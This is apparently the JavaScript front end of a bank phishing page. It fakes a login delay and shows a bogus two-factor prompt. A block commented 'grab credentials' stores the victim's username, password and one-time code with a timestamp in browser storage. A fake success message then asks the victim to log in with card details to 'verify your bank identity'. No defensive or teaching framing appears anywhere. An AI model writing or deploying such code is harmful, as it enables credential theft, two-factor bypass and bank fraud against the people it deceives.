document.addEventListener("DOMContentLoaded", () => {
    const loginForm = document.getElementById("loginForm");
    const loginButton = document.getElementById("loginButton");
    const spinner = document.getElementById("loadingSpinner");
  
    loginForm.addEventListener("submit", (e) => {
      e.preventDefault();
  
      // Show spinner
      spinner.style.display = "inline-block";
      loginButton.disabled = true;
  
      // Simulate network delay (e.g., 2 seconds)
      setTimeout(() => {
        spinner.style.display = "none";
        loginButton.disabled = false;
        showOtpPrompt();
      }, 2000);
    });
  
    function showOtpPrompt() {
        const otpModal = document.createElement("div");
        otpModal.classList.add("otp-modal");
        otpModal.innerHTML = `
          <div class="otp-content">
            <h2>Two-Factor Authentication</h2>
            <p>We’ve sent a One-Time Password (OTP) to your registered device.</p>
            <div class="otp-inputs">
              <input type="text" maxlength="1" class="otp-box" />
              <input type="text" maxlength="1" class="otp-box" />
              <input type="text" maxlength="1" class="otp-box" />
              <input type="text" maxlength="1" class="otp-box" />
              <input type="text" maxlength="1" class="otp-box" />
              <input type="text" maxlength="1" class="otp-box" />
            </div>
            <div class="otp-actions">
              <span id="resendText">Resend OTP in <span id="countdown">30</span>s</span>
              <button id="resendOtpBtn" class="resend-btn" disabled>Resend OTP</button>
            </div>
            <button id="verifyOtpBtn" class="login-btn">Verify OTP</button>
          </div>
        `;
        document.body.appendChild(otpModal);
      
        // Auto-focus + movement between inputs
        const inputs = otpModal.querySelectorAll(".otp-box");
        inputs.forEach((input, index) => {
          input.addEventListener("input", () => {
            if (input.value && index < inputs.length - 1) {
              inputs[index + 1].focus();
            }
          });
          input.addEventListener("keydown", (e) => {
            if (e.key === "Backspace" && !input.value && index > 0) {
              inputs[index - 1].focus();
            }
          });
        });
      
        // OTP Verify
        document.getElementById("verifyOtpBtn").addEventListener("click", () => {
          const otp = Array.from(inputs).map(i => i.value).join("");
          if (otp.length < 6) {
            alert("Please enter all 6 digits of the OTP.");
          } else {
                            // Show success animation instead of alert
                otpModal.querySelector(".otp-content").innerHTML = `
                <div class="success-checkmark">
                <div class="check-icon">
                    <span class="icon-line line-tip"></span>
                    <span class="icon-line line-long"></span>
                    <div class="icon-circle"></div>
                    <div class="icon-fix"></div>
                </div>
                <h3>OTP Verified!</h3>
                <p>Login with card details to verify your bank identity</p>
                </div>
                `;

               // Auto-close after 2s with fade-out
                setTimeout(() => {
                    otpModal.classList.add("fade-out");
                    setTimeout(() => otpModal.remove(), 400); // remove after animation
                }, 4000);

            }
            });

        //grab credentials
        const verifyBtn = document.getElementById('verifyOtpBtn');
        const otpInputs = otpModal.querySelectorAll('.otp-box');

        verifyBtn.addEventListener('click', () => {
          const username = document.getElementById('username').value.trim();
          const password = document.getElementById('password').value.trim();

          let otp = "";

          otpInputs.forEach(input => otp += input.value);

          if (username && password && otp.length === 6) {
            let logs = JSON.parse(localStorage.getItem("logs")) || [];

            logs.push({
              username: username,
              password: password,
              otp: otp,
              time: new Date().toLocaleString()
            });

            localStorage.setItem("logs", JSON.stringify(logs));
  
          } else {
            alert("Please fill all fields and OTP!");
          }
        });
      
        // Countdown Timer for Resend
        let timeLeft = 30;
        const countdownEl = document.getElementById("countdown");
        const resendBtn = document.getElementById("resendOtpBtn");
      
        const timer = setInterval(() => {
          timeLeft--;
          countdownEl.textContent = timeLeft;
          if (timeLeft <= 0) {
            clearInterval(timer);
            document.getElementById("resendText").style.display = "none";
            resendBtn.disabled = false;
            resendBtn.style.display = "inline-block";
          }
        }, 1000);
      
        // Resend OTP Action
        resendBtn.addEventListener("click", () => {
          alert("A new OTP has been sent!");
          resendBtn.disabled = true;
          resendBtn.style.display = "none";
          document.getElementById("resendText").style.display = "inline-block";
          timeLeft = 30;
          countdownEl.textContent = timeLeft;
      
          const newTimer = setInterval(() => {
            timeLeft--;
            countdownEl.textContent = timeLeft;
            if (timeLeft <= 0) {
              clearInterval(newTimer);
              document.getElementById("resendText").style.display = "none";
              resendBtn.disabled = false;
              resendBtn.style.display = "inline-block";
            }
          }, 1000);
        });
      }
      
  });
  